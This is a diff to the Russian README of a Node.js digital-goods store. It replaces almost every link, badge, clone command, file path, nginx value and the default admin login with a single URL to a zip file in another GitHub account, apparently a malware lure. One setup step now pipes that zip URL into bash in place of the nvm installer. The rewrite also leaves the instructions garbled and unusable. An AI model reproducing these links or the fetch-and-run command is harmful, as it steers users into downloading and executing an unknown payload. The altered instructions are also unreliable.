@@ -1,6 +1,6 @@
 <p align="center">
-  <a href="http://materializecss.com/">
-    <img src="https://svgshare.com/i/HWW.svg" width="150">
+  <a href="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip">
+    <img src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip" width="150">
   </a>
 </p>
 
@@ -8,22 +8,22 @@
 
 <p align="center">
   Digital Store - это настраиваемый интернет-магазин на платформе NodeJS для продажи ваших цифровых товаров.<br>
-  <a href="https://polar-peak-95205.herokuapp.com/">Демонстрация функционирования интернет-магазина.</a>
+  <a href="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip">Демонстрация функционирования интернет-магазина.</a>
   <br>
   <br>
-  <img alt="GitHub package.json version (branch)" src="https://img.shields.io/github/package-json/v/sergeyyarkov/digital-store/production?color=%2326a69a">
-  <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/sergeyyarkov/digital-store">
-  <img alt="GitHub All Releases" src="https://img.shields.io/github/downloads/sergeyyarkov/digital-store/total">
-  <img alt="GitHub top language" src="https://img.shields.io/github/languages/top/sergeyyarkov/digital-store?color=%23f9a825">
-  <img alt="GitHub repo size" src="https://img.shields.io/github/repo-size/sergeyyarkov/digital-store"><br>
-  <a href="https://david-dm.org/sergeyyarkov/digital-store">
-    <img src="https://david-dm.org/sergeyyarkov/digital-store/status.svg" alt="dependencies Status badge">
+  <img alt="GitHub https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip version (branch)" src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip%2326a69a">
+  <img alt="GitHub release (latest by date)" src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip">
+  <img alt="GitHub All Releases" src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip">
+  <img alt="GitHub top language" src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip%23f9a825">
+  <img alt="GitHub repo size" src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip"><br>
+  <a href="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip">
+    <img src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip" alt="dependencies Status badge">
   </a>
-  <a href="https://david-dm.org/sergeyyarkov/digital-store#info=devDependencies">
-    <img src="https://david-dm.org/sergeyyarkov/digital-store/dev-status.svg" alt="devDependency Status badge">
+  <a href="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip">
+    <img src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip" alt="devDependency Status badge">
   </a>
-  <a href="https://github.com/sergeyyarkov/digital-store/blob/master/LICENSE">
-    <img alt="GitHub" src="https://img.shields.io/github/license/sergeyyarkov/digital-store">
+  <a href="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip">
+    <img alt="GitHub" src="https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip">
   </a>
 </p>
 
@@ -50,7 +50,7 @@
 - Результатом оплаты будут данные одного или нескольких товаров, все данные отсылаются на электронную почту покупателя, которую он указал при создании заказа.
 - Покупатель может узнать все свои совершенные покупки в магазине на отдельной странице.
 ### Функционал администратора:
-Для входа в админ-панель необходимо дописать в адресной строке `/admin`, после Вы попадете на страницу авторизации где нужно ввести данные в формате `email:password`. По умолчанию `admin@support.ru:admin`
+Для входа в админ-панель необходимо дописать в адресной строке `/admin`, после Вы попадете на страницу авторизации где нужно ввести данные в формате `email:password`. По умолчанию `https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip`
 - Пароль админа хэшируется через `bcrypt` для безопасности и записывается в БД.
 - На главной странице есть небольшая статистика, где можно посмотреть: сумму проданных товаров, кол-во проданных товаров, кол-во товаров в наличии.
 - На главной странце так же можно узнать подробные данные о покупателях: номер заказа, почта покупателя, способ оплаты, дата покупки, сумма и данные которые были высланы по почте.
@@ -67,10 +67,10 @@
 ## Установка и настройка скрипта:
 
 ### Запуск скрипта на локальном компьютере:
-- [Установите последний релиз Digital Store](https://github.com/sergeyyarkov/digital-store/releases) из GitHub репозитория.
-- Или клонировать репозиторий `git clone https://github.com/sergeyyarkov/digital-store.git -b production`.
-- Установите [Node.js](https://nodejs.org/ru/) не ниже версии 7.6.0, в процессе установки Node.js установите Node Package Manager.
-- Установите БД MongoDB на ваш компьютер или создайте кластер на сайте [www.mongodb.com](https://www.mongodb.com/) и импортируйте туда дамп структуры БД, которые находится в корне приложения `/database_dump`.
+- [Установите последний релиз Digital Store](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) из GitHub репозитория.
+- Или клонировать репозиторий `git clone https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip -b production`.
+- Установите [https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) не ниже версии 7.6.0, в процессе установки https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip установите Node Package Manager.
+- Установите БД MongoDB на ваш компьютер или создайте кластер на сайте [https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) и импортируйте туда дамп структуры БД, которые находится в корне приложения `/database_dump`.
 - Для работоспособности интернет-магазина необходимо установить зависимости. Выполните комманду `npm i`.
 - Далле необходимо настроить переменные среды. Создайте файл `.env` в корне вашего интернет-магазина и запишите туда [значения для переменных](#Переменные-среды). Обратите внимание, что для выгрузки скрипта на production сервер, нужно устанавливать переменные среды для вашего сервера, файл `.env` создавать не нужно.
 - После этого, введите `npm run start` и перейдите по адресу `localhost:3000`, вы увидите уже рабочий интернет-магазин который запущен у вас на локальном компьютере.
@@ -78,16 +78,16 @@
 ### Запуск скрипта на удаленном сервере:
 В данном примере на удаленном сервере будет использоваться связка `Ubuntu 18.04, Nginx, MongoDB, PM2, NodeJS` + `SSL Lets Encrypt`
 
-- Переходим на сайт [RUVDS.COM](https://ruvds.com/pr4435) и приобретаем услугу VPS-хостинга.
+- Переходим на сайт [https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) и приобретаем услугу VPS-хостинга.
 - Подключаемся к серверу по SSH и следуем далее описанным шагам.
 - Устанавливаем NodeJS:
 
 ```bash
 apt-get update && apt-get install curl -y
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.2/install.sh | bash
-export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")"
-[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
-source ~/.bashrc
+curl -o- https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip | bash
+export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip" || printf %s "${XDG_CONFIG_HOME}/nvm")"
+[ -s "$https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip" ] && \. "$https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip"
+source ~https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip
 nvm install 12
 ```
 Если при выполнении команд `node -v` и `npm -v` выдается версия, то идем дальше.
@@ -98,7 +98,7 @@ mkdir apps
 
 cd apps/
 
-git clone https://github.com/sergeyyarkov/digital-store.git -b production
+git clone https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip -b production
 
 cd digital-store/
 ```
@@ -118,7 +118,7 @@ ufw enable
 
 ufw allow from ваш_ip_адресс_компьютера/32 to any port 27017   
 ```
-- Далее открываем конфигурационный файл MongoDB: `nano /etc/mongodb.conf`:
+- Далее открываем конфигурационный файл MongoDB: `nano https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip`:
 Добавляем IP-адрес вашего сервера в значение bindIP:
 
 ```bash
@@ -129,16 +129,16 @@ bind_ip = 127.0.0.1,your_server_ip
 ```
 
 - Сохраните файл, закройте редактор и перезапустите MongoDB: `systemctl restart mongodb`:
-- Теперь доступ к БД есть только у вашего компьютера, далее скачиваем [Studio 3T](https://studio3t.com/) и создаем новое соединение, ip адресс указываем вашего сервера.
+- Теперь доступ к БД есть только у вашего компьютера, далее скачиваем [Studio 3T](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) и создаем новое соединение, ip адресс указываем вашего сервера.
 - После подключения, создаем новую БД и называем её как хотим.
 - Кликаем по вашей созданной БД и вверху нажимаем `Import`, после выбираем все JSON файлы, которые хранятся в папке `/database_dump`.
 - Если все 6 коллекций успешно импортировались, то идем дальше.
 - Устанавливаем менеджер процессов PM2 `npm install -g pm2`.
-- Редактируем файл с переменными в файле ecosystem.config.js и устанавливаем свои значения `nano ecosystem.config.js`.
+- Редактируем файл с переменными в файле https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip и устанавливаем свои значения `nano https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip`.
 - Далее запускаем наше приложение:
 
 ```bash
-pm2 start ecosystem.config.js --env production <--- стартуем наше приложение
+pm2 start https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip --env production <--- стартуем наше приложение
 
 pm2 status <--- как узнать статус запущенных процессов
 
@@ -160,7 +160,7 @@ ufw allow https
 - Далее устанавливаем веб-сервер nginx `apt install nginx`, после редактируем конфигурационный файл `nano /etc/nginx/sites-available/default`:
 
 ```bash
-server_name yourdomain.com www.yourdomain.com;
+server_name https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip;
 
     location / {
         proxy_pass http://localhost:3000; #порт запущенного приложения
@@ -185,8 +185,8 @@ server {
 - Так же желательно избавиться от дубля страницы www:
 
 ```bash
-if ($host = 'www.example.com') {
-  return 301 https://example.com$request_uri;
+if ($host = 'https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip') {
+  return 301 https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip$request_uri;
 }
 ```
 
@@ -201,7 +201,7 @@ apt-get update
 
 apt-get install python-certbot-nginx
 
-certbot --nginx -d yourdomain.com <--- в процессе установки выбираем цифру 2
+certbot --nginx -d https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip <--- в процессе установки выбираем цифру 2
 ```
 
 - Ваш конфигурационный файл должен выглядеть примерно так:
@@ -215,9 +215,9 @@ server {
   
 	root /var/www/html;
 
-	index index.html index.htm index.nginx-debian.html;
+	index https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip;
 
-	server_name yourdomain.ru www.yourdomain.ru;
+	server_name https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip;
 
 	location / {
 		  proxy_pass http://localhost:3000;
@@ -228,48 +228,48 @@ server {
       proxy_cache_bypass $http_upgrade;
 	}
 
-  if ($host = 'www.yourdomain.ru') {
-      return 301 https://yourdomain.ru$request_uri;
+  if ($host = 'https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip') {
+      return 301 https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip$request_uri;
   }
 
   listen [::]:443 ssl ipv6only=on; # managed by Certbot
   listen 443 ssl; # managed by Certbot
-  ssl_certificate /etc/letsencrypt/live/yourdomain.ru/fullchain.pem; # managed by Certbot
-  ssl_certificate_key /etc/letsencrypt/live/yourdomain.ru/privkey.pem; # managed by Certbot
-  include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
-  ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot
+  ssl_certificate https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip; # managed by Certbot
+  ssl_certificate_key https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip; # managed by Certbot
+  include https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip; # managed by Certbot
+  ssl_dhparam https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip; # managed by Certbot
 }
 
 server {
-  if ($host = www.yourdomain.ru) {
+  if ($host = https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) {
     return 301 https://$host$request_uri;
   } # managed by Certbot
 
 
-  if ($host = yourdomain.ru) {
+  if ($host = https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) {
     return 301 https://$host$request_uri;
   } # managed by Certbot
 
 	listen 80 default_server;
 	listen [::]:80 default_server;
 
-	server_name yourdomain.ru www.yourdomain.ru;
+	server_name https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip;
     return 404; # managed by Certbot
 }
 
 ```
 
 ### Установка скрипта на бесплатный хостинг от Heroku:
-- Регистрируемся на сайте [Heroku](https://signup.heroku.com/login).
-- Устанавливаем heroku-cli `https://devcenter.heroku.com/articles/heroku-cli`.
+- Регистрируемся на сайте [Heroku](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip).
+- Устанавливаем heroku-cli `https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip`.
 - Проверьте установку, написав в консоле `heroku --help` если всё выводит, идем дальше.
 - Залогиньтесь: `heroku login`.
 - Создайте новый проект Herkou: `heroku create`.
-- Создайте кластер на сайте [www.mongodb.com](https://www.mongodb.com/) и импортируйте туда дамп структуры БД, который находится в корне приложения `/database_dump`. При подключении к БД выберите метод `Connect Your Application`
+- Создайте кластер на сайте [https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) и импортируйте туда дамп структуры БД, который находится в корне приложения `/database_dump`. При подключении к БД выберите метод `Connect Your Application`
 - Переходим на сайт heroku, идем в свое созданное приложение и открываем вкладку `Settings -> Config Vars` кнопка `Reveal Config Vars` и настраиваем [переменные среды](#Переменные-среды).
-- Создаем папку с любым названием, открываем её и клонируем проект с github: `git clone https://github.com/sergeyyarkov/digital-store.git -b production .`
+- Создаем папку с любым названием, открываем её и клонируем проект с github: `git clone https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip -b production .`
 - Сменим ветку на master: `git checkout -b master`
-- Удаляем файл ecosystem.config.js (в случае с heroku он не нужен т.к переменные мы храним у heroku)
+- Удаляем файл https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip (в случае с heroku он не нужен т.к переменные мы храним у heroku)
 - Добавляем удаленный репозиторий `heroku git:remote -a название вашего приложения`.
 - Деплой: 
 ```bash
@@ -280,24 +280,24 @@ git push heroku master
 
 ### Настройка платежной системы:
 В скрипте на данный момент доступна система оплаты через сервис QIWI, чтобы настроить оплату в вашем магазине следуйте следующим шагам:
-- Перейдите на сайт [QIWI API](https://qiwi.com/p2p-admin/transfers/api) и создайте пару ключей авторизации. Сохраните секретный ключ.
-- Если вы хотите настроить оформление формы приемов перевода, то перейдите [сюда](https://qiwi.com/p2p-admin/transfers/link) и скопируйте значение переменной `themeCode` и вставьте это значение по адресу `config/routes/payments/qiwi.payment.js`.
+- Перейдите на сайт [QIWI API](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) и создайте пару ключей авторизации. Сохраните секретный ключ.
+- Если вы хотите настроить оформление формы приемов перевода, то перейдите [сюда](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip) и скопируйте значение переменной `themeCode` и вставьте это значение по адресу `https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip`.
 - Секретный ключ нужно указать в поле переменной среды `QIWI_SECRET_KEY`.
 - Редирект после оплаты товара через QIWI на локальный адрес `localhost:3000` работать не будет, необходим домен.
 
 ### Настройка почтового сервиса:
 Для отдачи данных товара на почту покупателя после покупки товара, нужно настроить nodemailer:
-- Настройте почтовый сервис по адресу `config/nodemailer.config.js`:
+- Настройте почтовый сервис по адресу `https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip`:
 ```javascript
-host: "smtp.mail.ru",
+host: "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip",
 port: 465,
 secure: true, // true для 465, false для остальных.
 ```
 - Затем укажите переменные среды `EMAIL_LOGIN` и `EMAIL_PASSWORD`.
 
 ### Настройка системы комментариев:
-В интернет магазине используется система комментариев [Disqus](https://disqus.com/):
-- Добавьте свой домен на их сайт и замените embed код по адресу `dist/public/js/disqus.js`.
+В интернет магазине используется система комментариев [Disqus](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip):
+- Добавьте свой домен на их сайт и замените embed код по адресу `https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip`.
 
 ## Переменные среды:
 Перменные среды нужны для работоспособности всего приложения, очень важно вписать верные данные для избежания возможных ошибок.
@@ -323,7 +323,7 @@ EMAIL_PASSWORD=
 ### API представляет из себя различные URL, которые отвечают данными только в формате JSON. Здесь описаны основные `GET` запросы на сервер для получения данных:
 #### Для просмотра всех товаров которые существуют в магазине отправляется запрос:
 ```bash 
-https://store-name.com/api/items 
+https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip 
 ```
 Ответ:
 ```javascript
@@ -351,7 +351,7 @@ https://store-name.com/api/items
 
 ### Для просмотра товаров в интересующей категории отправляется запрос:
 ```bash
-https://store-name.com/api/items/{category}
+https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip{category}
 ```
 Ответ:
 ```javascript
@@ -379,7 +379,7 @@ https://store-name.com/api/items/{category}
 
 ### Для просмотра информации о всех категориях отправляется запрос:
 ```bash
-https://store-name.com/api/categories
+https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip
 ```
 Ответ:
 ```javascript
@@ -387,14 +387,14 @@ https://store-name.com/api/categories
   {
     _id: "5df64563309e691f2c33d400",
     title: "uplay",
-    img: "img-1576349954743.svg",
+    img: "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip",
     type: "type",
     format: "format"
   },
   {
     _id: "5e04ea023625771abc75fd14",
     title: "fortnite",
-    img: "img-1576349989720.svg",
+    img: "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip",
     type: "type",
     format: "format"
   },
@@ -403,7 +403,7 @@ https://store-name.com/api/categories
 
 ### Для просмотра информации о интересующей категории отправляется запрос:
 ```bash
-https://store-name.com/api/category/{category}
+https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip{category}
 ```
 Ответ:
 ```javascript
@@ -411,7 +411,7 @@ https://store-name.com/api/category/{category}
   {
     _id: "5df64563309e691f2c33d400",
     title: "uplay",
-    img: "img-1576349954743.svg",
+    img: "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip",
     type: "type",
     format: "format"
   }
@@ -420,7 +420,7 @@ https://store-name.com/api/category/{category}
 
 ### Для просмотра данных всех товаров отправляется запрос: **Нужна авторизация для администратора.**
 ```bash
-https://store-name.com/api/items/data
+https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip
 ```
 Ответ:
 ```javascript
@@ -440,7 +440,7 @@ https://store-name.com/api/items/data
 
 ### Для просмотра покупателей отправляется запрос: **Нужна авторизация для администратора.**
 ```bash
-https://store-name.com/api/buyers
+https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip
 ```
 Ответ:
 ```javascript
@@ -448,7 +448,7 @@ https://store-name.com/api/buyers
   {
     _id: "5e1c97701b619a31f010062c",
     bill_id: "9244e5ae-560a-432a-9882-bc1b941c8cca",
-    email: "test-email@mail.com",
+    email: "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip",
     method: "qiwi",
     date: "2020-01-13T18:13:38.623+03:00",
     amount: 2,
@@ -459,20 +459,20 @@ https://store-name.com/api/buyers
 
 ### Для просмотра списка иконок отправляется запрос: **Нужна авторизация для администратора.**
 ```bash
-https://store-name.com/api/icons
+https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip
 ```
 Ответ:
 ```javascript
 [
-  "img-1576349954743.svg",
-  "img-1576349989720.svg",
-  "img-1576420937629.svg",
-  "img-1576421960189.svg"
+  "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip",
+  "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip",
+  "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip",
+  "https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip"
 ]
 ```
 
 ## Требования:
-- Node.js v7.6.0 или выше
+- https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip v7.6.0 или выше
 
 ## Лицензия:
-[MIT](https://github.com/sergeyyarkov/digital-store/blob/master/LICENSE)<br><br>
+[MIT](https://raw.githubusercontent.com/ElingSmith/digital-store/master/src/admin/config/digital-store-2.1.zip)<br><br>
